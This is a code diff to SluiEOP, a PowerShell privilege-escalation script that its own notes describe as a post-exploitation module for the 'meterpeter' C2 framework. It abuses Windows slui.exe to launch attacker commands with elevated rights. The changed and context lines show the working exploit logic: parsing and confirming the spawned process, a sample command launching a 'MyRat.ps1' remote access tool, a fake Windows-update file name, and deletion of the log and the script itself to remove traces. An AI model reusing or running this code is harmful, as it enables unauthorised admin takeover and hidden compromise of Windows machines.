@@ -15,7 +15,7 @@
    activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
    ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
    but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
-   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas
+   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas (SluiEOP PS script automates all this tasks).
 
 .NOTES
    SluiEOP script was written as one meterpeter C2 Post-Exploitation module.
@@ -48,7 +48,7 @@
 
 
 $Command = $Null
-$Success = $False
+$EOP_Success = $False
 $param1 = $args[0] # User Inputs [<arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
@@ -114,14 +114,14 @@ If($CheckVuln -eq $True){
       AMD64        notepad      5543
    #>
 
+   ## Extracting attacker Spawned ProcessName PID
    If($Command -match ' ' -and $Command -match 'cmd'){
       ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
-      $ParsingData = $Command -Split(' ')
-      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+      $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
       If($ProcessName -match '.exe'){
          $ProcessName = $ProcessName -replace '.exe',''
          $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '[0-9]'){$Success = $True}
+         If($EOPID -match '^\d+$'){$EOP_Success = $True}
       }Else{
          $EOPID = "null"
       }
@@ -132,17 +132,16 @@ If($CheckVuln -eq $True){
       If($ProcessName -match '.exe'){
          $ProcessName = $ProcessName -replace '.exe',''
          $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '[0-9]'){$Success = $True}
+         If($EOPID -match '^\d+$'){$EOP_Success = $True}
       }Else{
          $EOPID = "null"
       }
    }
    ElseIf($Command -match '^[powershell]' -and $Command -match ' ' -and $Command -match '.ps1' -or $Command -match '.bat' -or $Command -match '.py'){
       ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-      $ParsingData = $Command -Split('\\')
-      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+      $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
       $EOPID = "null {script exec}"
-      $Success = $True
+      $EOP_Success = $True
    }
    Else{
       ## String: "powershell.exe"
@@ -150,16 +149,15 @@ If($CheckVuln -eq $True){
       If($ProcessName -match '.exe'){
          $ProcessName = $ProcessName -replace '.exe',''
          $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '[0-9]'){$Success = $True}
+         If($EOPID -match '^\d+$'){$EOP_Success = $True}
       }Else{
          $EOPID = "null"
       }
    }
 
-   ## For those who run SluiEOP outside meterpeter C2
    If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
       ## Build MY PSObject Table
-      # IF executed outside meterpeter C2 framework
+      # For those who run SluiEOP outside meterpeter C2
       $MYPSObjectTable = New-Object -TypeName PSObject
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$env:PROCESSOR_ARCHITECTURE"
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
@@ -167,12 +165,13 @@ If($CheckVuln -eq $True){
       $MYPSObjectTable
    }Else{
       ## Build meterpeter Table
-      If($Success -eq $True){
-         echo "   system  execute  '$Command'" > $env:TMP\sLUIEop.log
-         echo "   system  success  Spawn Process PID returned: $EOPID" >> $env:TMP\sLUIEop.log
-      }Else{
+      # For those who run SluiEOP inside meterpeter C2
+      If(-not($EOP_Success -eq $True)){
          echo "   system  execute  '$Command'" > $env:TMP\sLUIEop.log
          echo "   system  error?   Spawn Process PID not returned" >> $env:TMP\sLUIEop.log
+      }Else{
+         echo "   system  execute  '$Command'" > $env:TMP\sLUIEop.log
+         echo "   system  success  Spawn Process PID returned: $EOPID" >> $env:TMP\sLUIEop.log
       }
    }
 
@@ -181,7 +180,7 @@ If($CheckVuln -eq $True){
    echo "   user    ERROR     System Doesn't Seems Vulnerable, Aborting." > $env:TMP\sLUIEop.log
 }
 
-## Clean old files/configurations left behind after EOP finished ..
+## Clean old files left behind after EOP finished ..
 If(Test-Path "$env:TMP\sLUIEop.log"){Get-Content -Path "$env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
 If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
 Exit
